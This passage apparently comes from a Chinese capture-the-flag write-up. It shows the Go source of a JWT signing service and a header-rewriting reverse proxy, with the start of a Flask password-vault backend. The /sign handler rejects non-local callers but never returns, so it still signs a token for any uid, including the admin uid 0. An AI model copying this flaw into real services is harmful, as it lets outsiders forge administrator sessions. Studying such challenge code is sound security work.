</span></span><span class=line><span class=cl>			<span class=nx>NotBefore</span><span class=p>:</span> <span class=nx>jwt</span><span class=p>.</span><span class=nf>NewNumericDate</span><span class=p>(</span><span class=nx>time</span><span class=p>.</span><span class=nf>Now</span><span class=p>()),</span>
</span></span><span class=line><span class=cl>		<span class=p>},</span>
</span></span><span class=line><span class=cl>	<span class=p>})</span>
</span></span><span class=line><span class=cl>	<span class=nx>tokenString</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>t</span><span class=p>.</span><span class=nf>SignedString</span><span class=p>([]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>SecretKey</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=s>&#34;&#34;</span><span class=p>,</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>tokenString</span><span class=p>,</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>GetUIDFromRequest</span><span class=p>(</span><span class=nx>r</span> <span class=o>*</span><span class=nx>http</span><span class=p>.</span><span class=nx>Request</span><span class=p>)</span> <span class=kt>string</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>authHeader</span> <span class=o>:=</span> <span class=nx>r</span><span class=p>.</span><span class=nx>Header</span><span class=p>.</span><span class=nf>Get</span><span class=p>(</span><span class=s>&#34;Authorization&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>authHeader</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>cookie</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>r</span><span class=p>.</span><span class=nf>Cookie</span><span class=p>(</span><span class=s>&#34;token&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>err</span> <span class=o>==</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>authHeader</span> <span class=p>=</span> <span class=s>&#34;Bearer &#34;</span> <span class=o>+</span> <span class=nx>cookie</span><span class=p>.</span><span class=nx>Value</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nx>authHeader</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>7</span> <span class=o>||</span> <span class=p>!</span><span class=nx>strings</span><span class=p>.</span><span class=nf>HasPrefix</span><span class=p>(</span><span class=nx>authHeader</span><span class=p>,</span> <span class=s>&#34;Bearer &#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>tokenString</span> <span class=o>:=</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>TrimSpace</span><span class=p>(</span><span class=nx>authHeader</span><span class=p>[</span><span class=mi>7</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>tokenString</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>token</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nf>ParseWithClaims</span><span class=p>(</span><span class=nx>tokenString</span><span class=p>,</span> <span class=o>&amp;</span><span class=nx>AuthClaims</span><span class=p>{},</span> <span class=kd>func</span><span class=p>(</span><span class=nx>token</span> <span class=o>*</span><span class=nx>jwt</span><span class=p>.</span><span class=nx>Token</span><span class=p>)</span> <span class=p>(</span><span class=kd>interface</span><span class=p>{},</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>ok</span> <span class=o>:=</span> <span class=nx>token</span><span class=p>.</span><span class=nx>Method</span><span class=p>.(</span><span class=o>*</span><span class=nx>jwt</span><span class=p>.</span><span class=nx>SigningMethodHMAC</span><span class=p>);</span> <span class=p>!</span><span class=nx>ok</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Errorf</span><span class=p>(</span><span class=s>&#34;unexpected signing method: %v&#34;</span><span class=p>,</span> <span class=nx>token</span><span class=p>.</span><span class=nx>Header</span><span class=p>[</span><span class=s>&#34;alg&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=p>[]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>SecretKey</span><span class=p>),</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl>	<span class=p>})</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;failed to parse token: %v&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>claims</span><span class=p>,</span> <span class=nx>ok</span> <span class=o>:=</span> <span class=nx>token</span><span class=p>.</span><span class=nx>Claims</span><span class=p>.(</span><span class=o>*</span><span class=nx>AuthClaims</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>!</span><span class=nx>ok</span> <span class=o>||</span> <span class=p>!</span><span class=nx>token</span><span class=p>.</span><span class=nx>Valid</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;invalid token claims&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>claims</span><span class=p>.</span><span class=nx>UID</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>authorizer</span> <span class=o>:=</span> <span class=o>&amp;</span><span class=nx>httputil</span><span class=p>.</span><span class=nx>ReverseProxy</span><span class=p>{</span><span class=nx>Director</span><span class=p>:</span> <span class=kd>func</span><span class=p>(</span><span class=nx>req</span> <span class=o>*</span><span class=nx>http</span><span class=p>.</span><span class=nx>Request</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>req</span><span class=p>.</span><span class=nx>URL</span><span class=p>.</span><span class=nx>Scheme</span> <span class=p>=</span> <span class=s>&#34;http&#34;</span>
</span></span><span class=line><span class=cl>		<span class=nx>req</span><span class=p>.</span><span class=nx>URL</span><span class=p>.</span><span class=nx>Host</span> <span class=p>=</span> <span class=s>&#34;127.0.0.1:5000&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=nx>uid</span> <span class=o>:=</span> <span class=nf>GetUIDFromRequest</span><span class=p>(</span><span class=nx>req</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Request UID: %s, URL: %s&#34;</span><span class=p>,</span> <span class=nx>uid</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>URL</span><span class=p>.</span><span class=nf>String</span><span class=p>())</span>
</span></span><span class=line><span class=cl>		<span class=nx>req</span><span class=p>.</span><span class=nx>Header</span><span class=p>.</span><span class=nf>Del</span><span class=p>(</span><span class=s>&#34;Authorization&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>req</span><span class=p>.</span><span class=nx>Header</span><span class=p>.</span><span class=nf>Del</span><span class=p>(</span><span class=s>&#34;X-User&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>req</span><span class=p>.</span><span class=nx>Header</span><span class=p>.</span><span class=nf>Del</span><span class=p>(</span><span class=s>&#34;X-Forwarded-For&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>req</span><span class=p>.</span><span class=nx>Header</span><span class=p>.</span><span class=nf>Del</span><span class=p>(</span><span class=s>&#34;Cookie&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>uid</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>req</span><span class=p>.</span><span class=nx>Header</span><span class=p>.</span><span class=nf>Set</span><span class=p>(</span><span class=s>&#34;X-User&#34;</span><span class=p>,</span> <span class=s>&#34;anonymous&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>req</span><span class=p>.</span><span class=nx>Header</span><span class=p>.</span><span class=nf>Set</span><span class=p>(</span><span class=s>&#34;X-User&#34;</span><span class=p>,</span> <span class=nx>uid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>signRouter</span> <span class=o>:=</span> <span class=nx>mux</span><span class=p>.</span><span class=nf>NewRouter</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=nx>signRouter</span><span class=p>.</span><span class=nf>HandleFunc</span><span class=p>(</span><span class=s>&#34;/sign&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>w</span> <span class=nx>http</span><span class=p>.</span><span class=nx>ResponseWriter</span><span class=p>,</span> <span class=nx>r</span> <span class=o>*</span><span class=nx>http</span><span class=p>.</span><span class=nx>Request</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>!</span><span class=nx>strings</span><span class=p>.</span><span class=nf>HasPrefix</span><span class=p>(</span><span class=nx>r</span><span class=p>.</span><span class=nx>RemoteAddr</span><span class=p>,</span> <span class=s>&#34;127.0.0.1:&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>http</span><span class=p>.</span><span class=nf>Error</span><span class=p>(</span><span class=nx>w</span><span class=p>,</span> <span class=s>&#34;Forbidden&#34;</span><span class=p>,</span> <span class=nx>http</span><span class=p>.</span><span class=nx>StatusForbidden</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=nx>uid</span> <span class=o>:=</span> <span class=nx>r</span><span class=p>.</span><span class=nx>URL</span><span class=p>.</span><span class=nf>Query</span><span class=p>().</span><span class=nf>Get</span><span class=p>(</span><span class=s>&#34;uid&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>token</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nf>SignToken</span><span class=p>(</span><span class=nx>uid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>log</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Failed to sign token: %v&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=nx>http</span><span class=p>.</span><span class=nf>Error</span><span class=p>(</span><span class=nx>w</span><span class=p>,</span> <span class=s>&#34;Failed to generate token&#34;</span><span class=p>,</span> <span class=nx>http</span><span class=p>.</span><span class=nx>StatusInternalServerError</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=nx>w</span><span class=p>.</span><span class=nf>Write</span><span class=p>([]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>token</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>}).</span><span class=nf>Methods</span><span class=p>(</span><span class=s>&#34;GET&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>log</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Sign service is running at 127.0.0.1:4444&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>go</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>http</span><span class=p>.</span><span class=nf>ListenAndServe</span><span class=p>(</span><span class=s>&#34;127.0.0.1:4444&#34;</span><span class=p>,</span> <span class=nx>signRouter</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>log</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Authorizer middleware service is running at :5555&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>http</span><span class=p>.</span><span class=nf>ListenAndServe</span><span class=p>(</span><span class=s>&#34;:5555&#34;</span><span class=p>,</span> <span class=nx>authorizer</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>生成随机密钥， 提供一个<code>/sign</code>，接受 <code>?uid=...</code> 并返回一个用 <code>HS256</code> 签名的 JWT（有效期 1 小时）。<code>/sign</code>只有本机请求允许，admin 的 uid 为 0</p><p>在 <code>:5555</code> 上运行一个反向代理（authorizer），把外部请求转发到后端 Flask（<code>127.0.0.1:5000</code>），并根据请求中的 JWT（cookie 或 <code>Authorization</code>）解析出 <code>uid</code>，把它放到转发请求的 <code>X-User</code> 头里。</p><p>调用 <code>GetUIDFromRequest(req)</code>，尝试从 <code>Authorization</code> 标头或 <code>token</code> Cookie 中解析 JWT 令牌，获取用户 ID (<code>uid</code>)。它会主动删除所有来自外部用户的 <code>X-User</code> 标头。这是为了防止攻击者直接发送 <code>X-User: 0</code> 来伪造身份。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>secrets</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>datetime</span> <span class=kn>import</span> <span class=n>datetime</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>functools</span> <span class=kn>import</span> <span class=n>wraps</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>cryptography.fernet</span> <span class=kn>import</span> <span class=n>Fernet</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>Flask</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>flash</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>g</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>jsonify</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>make_response</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>redirect</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>render_template</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>url_for</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask_sqlalchemy</span> <span class=kn>import</span> <span class=n>SQLAlchemy</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sqlalchemy.exc</span> <span class=kn>import</span> <span class=n>IntegrityError</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>db</span> <span class=o>=</span> <span class=n>SQLAlchemy</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>User</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>Model</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>id</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>Integer</span><span class=p>,</span> <span class=n>primary_key</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>String</span><span class=p>(</span><span class=mi>80</span><span class=p>),</span> <span class=n>unique</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>nullable</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>password_hash</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>String</span><span class=p>(</span><span class=mi>128</span><span class=p>),</span> <span class=n>nullable</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>salt</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>String</span><span class=p>(</span><span class=mi>64</span><span class=p>),</span> <span class=n>nullable</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>created_at</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>DateTime</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=n>datetime</span><span class=o>.</span><span class=n>utcnow</span><span class=p>,</span> <span class=n>nullable</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vault_entries</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>relationship</span><span class=p>(</span><span class=s1>&#39;VaultEntry&#39;</span><span class=p>,</span> <span class=n>backref</span><span class=o>=</span><span class=s1>&#39;user&#39;</span><span class=p>,</span> <span class=n>lazy</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>cascade</span><span class=o>=</span><span class=s1>&#39;all, delete-orphan&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>VaultEntry</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>Model</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>id</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>Integer</span><span class=p>,</span> <span class=n>primary_key</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>user_id</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>Integer</span><span class=p>,</span> <span class=n>db</span><span class=o>.</span><span class=n>ForeignKey</span><span class=p>(</span><span class=s1>&#39;user.id&#39;</span><span class=p>),</span> <span class=n>nullable</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>label</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>String</span><span class=p>(</span><span class=mi>120</span><span class=p>),</span> <span class=n>nullable</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>login</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>String</span><span class=p>(</span><span class=mi>120</span><span class=p>),</span> <span class=n>nullable</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>password_encrypted</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>Text</span><span class=p>,</span> <span class=n>nullable</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>notes</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>Text</span><span class=p>)</span>
